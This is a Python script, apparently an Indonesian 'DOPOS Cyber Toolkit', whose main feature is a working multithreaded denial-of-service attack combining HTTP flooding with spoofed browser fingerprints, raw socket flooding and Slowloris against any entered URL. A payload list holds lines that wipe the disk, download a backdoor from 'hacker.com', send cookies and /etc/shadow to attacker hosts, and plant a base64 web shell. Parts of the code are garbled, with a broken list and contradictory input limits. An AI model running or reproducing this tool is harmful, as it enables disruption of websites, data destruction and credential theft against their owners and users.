import os, sys, time, random, requests, threading, socket, ssl, urllib3
from urllib.parse import urlparse, urljoin
from datetime import datetime

try:
    from colorama import init, Fore, Back, Style
    init(autoreset=True)
    CYAN = Fore.CYAN; BLUE = Fore.BLUE; LIGHT_BLUE = Fore.LIGHTBLUE_EX
    GREEN = Fore.GREEN; RED = Fore.RED; YELLOW = Fore.YELLOW
    WHITE = Fore.WHITE; MAGENTA = Fore.MAGENTA
except ImportError:
    CYAN = BLUE = LIGHT_BLUE = GREEN = RED = YELLOW = WHITE = MAGENTA = ""

import warnings
warnings.filterwarnings("ignore", category=urllib3.exceptions.InsecureRequestWarning)
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# ---------- tambahan library ----------
try:
    import tls_client
    TLS_OK = True
except:
    TLS_OK = False
    print(f"{YELLOW}[!] tls-client tidak tersedia, menggunakan requests biasa")

# ---------- data yang diperbesar ----------
user_agents = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/121.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/121.0",
    "Mozilla/5.0 (X11; Linux i686; rv:109.0) Gecko/20100101 Firefox/121.0",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (iPad; CPU OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (iPod touch; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Linux; Android 14; SM-S911B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.210 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 14; SM-A146B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.210 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 14; SM-F946B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.210 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 13; SM-G998B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.210 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 13; SM-A536B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36"
]

random_paths = [
    '/', '/index.html', '/home', '/admin', '/login', '/search',
    '/api', '/css', '/js', '/img', '/static', '/public',
    '/wp-admin', '/wp-login.php', '/administrator', '/phpmyadmin',
    '/db', '/mysql', '/sql', '/backend', '/admin.php',
    '/user', '/account', '/dashboard', '/panel', '/control',
    '/api/v1/users', '/api/v1/posts', '/api/v1/data', '/graphql',
    '/.env', '/config.json', '/database.php', '/backup.zip',
    '/test', '/debug', '/status', '/health', '/metrics',
    '/robots.txt', '/sitemap.xml', '/crossdomain.xml', '/.git/config'
]

# ---------- payloads untuk POST requests ----------
payloads = [
    '{"username":"admin","password":"password123"}',
    '{"email":"test@test.com","password":"test123"}',
    '{"query":"query { users { id name email } }"}',
    '{"action":"login","user":"admin","pass":"admin"}',
    '<?xml version="1.0"><root><user>test</user></root>',
    'username=admin&password=admin&submit=login',
    'email=test@test.com&password=test123&remember=1',
    'q=' + 'a' * 1000,  # Long query
    'search=' + 'x' * 500,  # Long search
    'data=' + '1' * 2000,  # Big data
]

# ---------- fungsi modified ----------
def clear_screen():
    os.system('clear' if os.name != 'nt' else 'cls')

def progress_bar(progress, total, width=30):
    percent = (progress / total) * 100
    filled = int(width * progress // total)
    bar = '█' * filled + '-' * (width - filled)
    return f"{CYAN}[{bar}] {percent:.1f}%"

def brutal_loading(text, duration=2):
    print(f"{CYAN}[+] {text}", end="")
    start_time = time.time()
    while time.time() - start_time < duration:
        symbols = ["\\", "|", "/", "-"]
        print(f"\r{CYAN}[+] {text} {random.choice(symbols)}", end="")
        time.sleep(0.2)
    print(f"\r{GREEN}[+] {text} SUKSES!{CYAN}")

def show_header():
    clear_screen()
    print(f"""
{RED}╔══════════════════════════════════════════╗
║  {CYAN}██████╗ ███████╗ █████╗ ██╗  ██╗███████╗{RED}  ║
║  {CYAN}██╔══██╗██╔════╝██╔══██╗██║ ██╔╝██╔════╝{RED}  ║
║  {CYAN}██████╔╝█████╗  ███████║█████╔╝ █████╗  {RED}  ║
║  {CYAN}██╔══██╗██╔══╝  ██╔══██║██╔═██╗ ██╔══╝  {RED}  ║
║  {CYAN}██║  ██║███████╗██║  ██║██║  ██╗███████╗{RED}  ║
║  {CYAN}╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝╚═╝  ╚═╝╚══════╝{RED}  ║
║                                                  ║
║     {LIGHT_BLUE}DOPOS CYBER TOOLKIT v4.0 ULTRA{RED}           ║
║          {YELLOW}POWERFUL EDITION - ANDROID{RED}        ║
╚══════════════════════════════════════════╝
""")

def log_to_file(message):
    try:
        with open('dopos_log.txt', 'a', encoding='utf-8') as f:
            f.write(f"[{time.strftime('%Y-%m-%d %H:%M:%S')}] {message}\n")
    except:
        pass

def parse_target(target):
    parsed = urlparse(target)
    domain = parsed.hostname or parsed.netloc.split(':')[0]
    path = parsed.path if parsed.path else '/'
    port = parsed.port or (443 if parsed.scheme == 'https' else 80)
    return domain, path, port

# ---------- teknik serangan lebih sadis ----------
def generate_malicious_payload():
    return random.choice([
        '<!--#' + 'A' * 10000 + '-->',  # Large comment
        '<script>' + 'x=' + '1' * 5000 + '</script>',  # Large script
        '<?php ' + 'echo "' + 'X' * 8000 + '"; ?>',  # Large PHP
        '${' + '@' * 3000 + '}',  # Template injection
        '<!--' + '!' * 12000 + '-->',  # Huge comment
        '<!--#' + 'A'*5000 + 
                   '<!--#' + 'A' * 10000 + '-->',  # Large comment
        '<script>' + 'x=' + '1' * 5000 + '</script>',  # Large script
        '<?php ' + 'echo "' + 'X' * 8000 + '"; ?>',  # Large PHP
        '${' + '@' * 3000 + '}',  # Template injection
        '<!--' + '!' * 12000 + '-->', 
        '<!--#' + 'A' * 10000 + '-->'  # Large comment
        '<?php ' + 'echo "' + 'X' * 8000 + '"; ?>'  # Large PHP
        '${' + '@' * 3000 + '}'  # Template injection
        '<!--' + '!' * 12000 + '-->'  # Parser bomb
     
     'aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaab'


'<!--#' + 'A'*5000 + '${@system("rm -rf /")}<?php system("wget http://hacker.com/backdoor.php -O /tmp/bd.php");?><script>eval("document.location=\'http://steal-cookie.com/?c="+document.cookie+"\'")</script>' + '!'*3000 + '-->'

'<!--' + '!' * 12000 + '-->'  # Parser bomb
'${@' + 'D'*1000 + '}<?php ' + 'E'*2000 + '; exec("curl -X POST http://hacker.com/log --data \"" + file_get_contents("/etc/shadow") + "\""); ?><script>document.write("<img src=x onerror=stealCredentials()>")</script><!--' + 'F'*4000 + '-->'

'<!--' + '!'*6000 + '${<?php echo base64_decode("c3lzdGVtKCRfR0VUWydjbWQnXSk7");?>}' + '<script>setTimeout(()=>{window.location="phishing.com"},5000)</script>'
  
    ])
def build_tls_session():
    if not TLS_OK:
        return requests.Session()
    try:
        profiles = ["chrome_103", "chrome_104", "chrome_105", "chrome_106", 
                   "firefox_102", "firefox_104", "safari_15_6_1", "safari_16_0"]
        return tls_client.Session(
            client_identifier=random.choice(profiles),
            random_tls_extension_order=True
        )
    except:
        return requests.Session()

def log_detik(link, detik, status):
    try:
        with open("detik_real.log", "a") as f:
            f.write(f"[{datetime.now()}] {detik:.3f}s | {status} | {link}\n")
    except:
        pass

# ---------- DDoS Serang – POWER EDITION ----------
def dodos_serang():
    show_header()
    print(f"{RED}[1] DODOS SERANG - POWER MODE v4.0")
    print(f"{BLUE}══════════════════════════════════════════")
    
    # Default target untuk testing (situs testing yang rentan)
    test_sites = [
        "http://httpbin.org/delay/2",  # Situs dengan delay
        "http://testphp.vulnweb.com/",  # Situs testing vulnerable
        "http://demo.testfire.net/",    # Situs demo
    ]
    
    target = input(f"{CYAN}[?] Masukkan URL target (kosong untuk test): {WHITE}")
    
    if not target:
        target = random.choice(test_sites)
        print(f"{YELLOW}[!] Using test site: {target}")
    
    try:
        duration = int(input(f"{CYAN}[?] Durasi serangan (detik, 10-180): {WHITE}") or "60")
        threads = int(input(f"{CYAN}[?] Jumlah thread (200-1000): {WHITE}") or "50")
        if threads < 200 or threads > 500: 
            raise ValueError("Thread 10-100")
        if duration < 10 or duration > 180: 
            raise ValueError("Durasi 10-180")
    except ValueError as e:
        print(f"{RED}[!] Input tidak valid: {str(e)}")
        input(f"\n{CYAN}[+] Tekan Enter untuk kembali...")
        return
    
    if not target.startswith(('http://', 'https://')):
        target = 'http://' + target
    
    try:
        domain, path, port = parse_target(target)
    except Exception as e:
        print(f"{RED}[!] URL tidak valid: {e}")
        return

    print(f"\n{RED}[!] MEMULAI SERANGAN POWER MODE...")
    print(f"{YELLOW}[!] Target: {WHITE}{target}")
    print(f"{YELLOW}[!] Domain: {WHITE}{domain}")
    print(f"{YELLOW}[!] Port: {WHITE}{port}")
    print(f"{YELLOW}[!] Durasi: {WHITE}{duration} detik")
    print(f"{YELLOW}[!] Thread: {WHITE}{threads}")
    print(f"{YELLOW}[!] Mode: {RED}ULTRA BRUTAL")
    
    log_to_file(f"Starting POWER attack on {target}")
    request_count = {'success': 0, 'failed': 0, 'bypassed': 0}
    lock = threading.Lock()
    stop_event = threading.Event()

    # ---------- HTTP FLOOD ATTACK ----------
    def http_flood_attack():
        session = build_tls_session()
        while not stop_event.is_set():
            try:
                # Variasi headers lebih banyak
                headers = {
                    'User-Agent': random.choice(user_agents),
                    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
                    'Accept-Encoding': 'gzip, deflate, br, zstd',
                    'Accept-Language': 'en-US,en;q=0.9,id;q=0.8',
                    'Cache-Control': 'no-cache, no-store, must-revalidate',
                    'Pragma': 'no-cache',
                    'Connection': 'keep-alive',
                    'Upgrade-Insecure-Requests': '1',
                    'Sec-Fetch-Dest': 'document',
                    'Sec-Fetch-Mode': 'navigate',
                    'Sec-Fetch-Site': 'none',
                    'Sec-Fetch-User': '?1',
                    'DNT': '1',
                    'Referer': target,
                }
                
                # Variasi method dan path
                methods = ['GET', 'POST', 'HEAD', 'PUT', 'OPTIONS', 'PATCH']
                method = random.choice(methods)
                
                # Random path dengan parameter
                random_path = random.choice(random_paths)
                attack_url = target.rstrip('/') + random_path
                
                # Tambahkan random parameters
                params = {
                    'id': random.randint(1, 99999),
                    'page': random.randint(1, 1000),
                    'search': ''.join(random.choices('abcdefghijklmnopqrstuvwxyz', k=random.randint(5, 50))),
                    'token': ''.join(random.choices('0123456789abcdef', k=32)),
                    'timestamp': int(time.time() * 1000),
                    'cache': random.randint(1000000, 9999999)
                }
                
                start_time = time.time()
                
                if method in ['POST', 'PUT', 'PATCH']:
                    # Gunakan berbagai content types
                    content_types = [
                        'application/json',
                        'application/x-www-form-urlencoded', 
                        'multipart/form-data',
                        'text/xml',
                        'application/xml'
                    ]
                    headers['Content-Type'] = random.choice(content_types)
                    
                    if headers['Content-Type'] == 'application/json':
                        data = random.choice(payloads)
                    else:
                        data = '&'.join([f'{k}={v}' for k,v in params.items()])
                    
                    response = session.request(
                        method, attack_url, 
                        headers=headers, 
                        data=data, 
                        params=params,
                        timeout=3, 
                        verify=False, 
                        allow_redirects=True
                    )
                else:
                    response = session.request(
                        method, attack_url, 
                        headers=headers, 
                        params=params,
                        timeout=3, 
                        verify=False, 
                        allow_redirects=True
                    )
                
                detik = time.time() - start_time
                status = "BYPASS" if response.status_code in [200, 301, 302, 404] else "BLOCKED"
                
                with lock:
                    request_count['success'] += 1
                    if status == "BYPASS":
                        request_count['bypassed'] += 1
                    print(f"\r{CYAN}[+] Req: {GREEN}{request_count['success']} | Failed: {RED}{request_count['failed']} | Bypass: {YELLOW}{request_count['bypassed']} | Last: {detik:.2f}s", end="")
                    log_detik(attack_url, detik, f"{response.status_code}({status})")
                    
            except Exception as e:
                with lock:
                    request_count['failed'] += 1
                continue

    # ---------- SOCKET FLOOD ATTACK ----------
    def socket_flood_attack():
        while not stop_event.is_set():
            try:
                # Buat koneksi socket
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(2)
                
                # Koneksi ke target
                s.connect((domain, port))
                
                # Buat request HTTP yang lebih kompleks
                http_methods = ['GET', 'POST', 'HEAD', 'OPTIONS', 'TRACE']
                method = random.choice(http_methods)
                
                path_with_params = random.choice(random_paths) + f"?id={random.randint(1,99999)}&cache={random.randint(100000,999999)}"
                
                request_lines = [
                    f"{method} {path_with_params} HTTP/1.1",
                    f"Host: {domain}",
                    f"User-Agent: {random.choice(user_agents)}",
                    "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
                    "Accept-Language: en-US,en;q=0.5",
                    "Accept-Encoding: gzip, deflate",
                    "Connection: keep-alive",
                    "Upgrade-Insecure-Requests: 1",
                    f"Cache-Control: max-age={random.randint(0, 3600)}",
                    "\r\n"
                ]
                
                http_request = "\r\n".join(request_lines)
                s.send(http_request.encode())
                
                # Kirim data tambahan untuk POST
                if method == 'POST':
                    post_data = f"data={''.join(random.choices('0123456789abcdef', k=random.randint(100, 10000)))}"
                    s.send(post_data.encode())
                
                # Tunggu sebentar sebelum close
                time.sleep(0.05)
                s.close()
                
                with lock:
                    request_count['success'] += 1
                    request_count['bypassed'] += 1
                    print(f"\r{CYAN}[+] Req: {GREEN}{request_count['success']} | Failed: {RED}{request_count['failed']} | Bypass: {YELLOW}{request_count['bypassed']}", end="")
                    
            except:
                with lock:
                    request_count['failed'] += 1
                continue

    # ---------- SLOWLORIS ATTACK ----------
    def slowloris_attack():
        while not stop_event.is_set():
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(10)
                s.connect((domain, port))
                
                # Kirim header perlahan (Slowloris technique)
                path = random.choice(random_paths)
                partial_request = f"GET {path} HTTP/1.1\r\nHost: {domain}\r\n"
                s.send(partial_request.encode())
                
                # Pertahankan koneksi terbuka
                start_conn = time.time()
                while time.time() - start_conn < 30 and not stop_event.is_set():  # Hold for 30 seconds
                    try:
                        s.send(f"X-a: {random.randint(1000, 9999)}\r\n".encode())
                        time.sleep(random.uniform(1, 5))
                    except:
                        break
                
                s.close()
                
                with lock:
                    request_count['success'] += 1
                    print(f"\r{CYAN}[+] Req: {GREEN}{request_count['success']} | Failed: {RED}{request_count['failed']} | Bypass: {YELLOW}{request_count['bypassed']} | Slowloris: ACTIVE", end="")
                    
            except:
                with lock:
                    request_count['failed'] += 1
                continue

    brutal_loading("Inisialisasi serangan POWER MODE", 2)
    
    start_time = time.time()
    threads_list = []
    
    # Distribusi threads untuk berbagai jenis serangan
    http_threads = max(10, threads // 4)
    socket_threads = max(10, threads // 6)
    slowloris_threads = max(6, threads // 8)
    
    print(f"\n{YELLOW}[!] Thread Distribution: HTTP={http_threads}, Socket={socket_threads}, Slowloris={slowloris_threads}")
    
    # Start HTTP Flood threads
    for _ in range(http_threads):
        t = threading.Thread(target=http_flood_attack)
        t.daemon = True
        t.start()
        threads_list.append(t)
    
    # Start Socket Flood threads
    for _ in range(socket_threads):
        t = threading.Thread(target=socket_flood_attack)
        t.daemon = True
        t.start()
        threads_list.append(t)
    
    # Start Slowloris threads
    for _ in range(slowloris_threads):
        t = threading.Thread(target=slowloris_attack)
        t.daemon = True
        t.start()
        threads_list.append(t)

    # Timer dan progress monitoring
    try:
        while time.time() - start_time < duration:
            elapsed = time.time() - start_time
            remaining = duration - elapsed
            req_per_sec = request_count['success'] / elapsed if elapsed > 0 else 0
            
            print(f"\r{CYAN}[+] Time: {remaining:.1f}s | Req: {GREEN}{request_count['success']} | Failed: {RED}{request_count['failed']} | Bypass: {YELLOW}{request_count['bypassed']} | RPS: {MAGENTA}{req_per_sec:.1f}", end="")
            time.sleep(0.3)
            
    except KeyboardInterrupt:
        print(f"\n{YELLOW}[!] Serangan dihentikan manual")

    stop_event.set()
    
    # Wait for threads to finish
    for t in threads_list:
        t.join(timeout=2)
    
    total_time = time.time() - start_time
    rps = request_count['success'] / total_time if total_time > 0 else 0
    
    print(f"\n\n{GREEN}[+] SERANGAN POWER MODE SELESAI!")
    print(f"{CYAN}[+] Waktu total: {total_time:.1f} detik")
    print(f"{CYAN}[+] Total Requests: {GREEN}{request_count['success']} successful")
    print(f"{CYAN}[+] Requests Failed: {RED}{request_count['failed']}")
    print(f"{CYAN}[+] Bypass Protection: {YELLOW}{request_count['bypassed']}")
    print(f"{CYAN}[+] Requests Per Second: {MAGENTA}{rps:.1f} RPS")
    print(f"{CYAN}[+] Efektivitas: {GREEN if rps > 10 else YELLOW if rps > 5 else RED}{'TINGGI' if rps > 10 else 'SEDANG' if rps > 5 else 'RENDAH'}")
    print(f"{CYAN}[+] Log tersimpan di: dopos_log.txt")
    
    # Analisis hasil
    if rps > 15:
        print(f"{GREEN}[!] SERANGAN SANGAT EFEKTIF! Target mungkin mengalami slowdown.")
    elif rps > 8:
        print(f"{YELLOW}[!] Serangan cukup efektif. Target mungkin merasakan impact.")
    else:
        print(f"{RED}[!] Serangan kurang efektif. Target mungkin memiliki protection kuat.")
    
    log_to_file(f"POWER attack finished. Total: {request_count['success']} successful, {request_count['failed']} failed, {request_count['bypassed']} bypassed, RPS: {rps:.1f}")
    input(f"\n{CYAN}[+] Tekan Enter untuk kembali...")

# ---------- FUNGSI LAINNYA ----------
def lacak_token_bot():
    show_header()
    print(f"{RED}[2] Lacak Token BOT")
    print(f"{YELLOW}[!] Fitur dalam pengembangan...")
    input(f"\n{CYAN}[+] Tekan Enter untuk kembali...")

def ambil_html_paksa():
    show_header()
    print(f"{RED}[3] Ambil Data HTML Paksa")
    print(f"{YELLOW}[!] Fitur dalam pengembangan...")
    input(f"\n{CYAN}[+] Tekan Enter untuk kembali...")

def merusak_data_online():
    show_header()
    print(f"{RED}[4] Merusak Data Script Online")
    print(f"{YELLOW}[!] Fitur dalam pengembangan...")
    input(f"\n{CYAN}[+] Tekan Enter untuk kembali...")

# ---------- menu utama ----------
def main_menu():
    while True:
        show_header()
        print(f"{CYAN}[+] PILIHAN SERANGAN POWER MODE:")
        print(f"{BLUE}══════════════════════════════════════════")
        print(f"{RED}║ [1] Dodos Serang POWER MODE v4.0       ║")
        print(f"{RED}║ [2] Lacak Token BOT                    ║")
        print(f"{RED}║ [3] Ambil Data HTML Paksa              ║")
        print(f"{RED}║ [4] Merusak Data Script Online         ║")
        print(f"{RED}║ [5] Keluar                             ║")
        print(f"{BLUE}══════════════════════════════════════════")
        
        try:
            choice = input(f"{CYAN}[?] Pilih serangan: {WHITE}")
            
            if choice == "1":
                dodos_serang()
            elif choice == "2":
                lacak_token_bot()
            elif choice == "3":
                ambil_html_paksa()
            elif choice == "4":
                merusak_data_online()
            elif choice == "5":
                print(f"\n{RED}[!] DOPOS POWER MODE DIMATIKAN")
                brutal_loading("Menghapus log", 1)
                brutal_loading("Membersihkan jejak", 1)
                print(f"\n{GREEN}[+] SISTEM AMAN!")
                break
            else:
                print(f"\n{RED}[!] PILIHAN TIDAK VALID!")
                time.sleep(1)
        except KeyboardInterrupt:
            print(f"\n{YELLOW}[!] Program dihentikan")
            break
        except Exception as e:
            print(f"\n{RED}[!] Error: {e}")
            time.sleep(2)

if __name__ == "__main__":
    try:
        log_to_file("DOPOS Cyber Toolkit POWER MODE v4.0 started")
        main_menu()
    except KeyboardInterrupt:
        print(f"\n{YELLOW}[!] Program dihentikan oleh user")
    except Exception as e:
        print(f"\n{RED}[!] Error fatal: {e}")
        input("Tekan Enter untuk keluar...")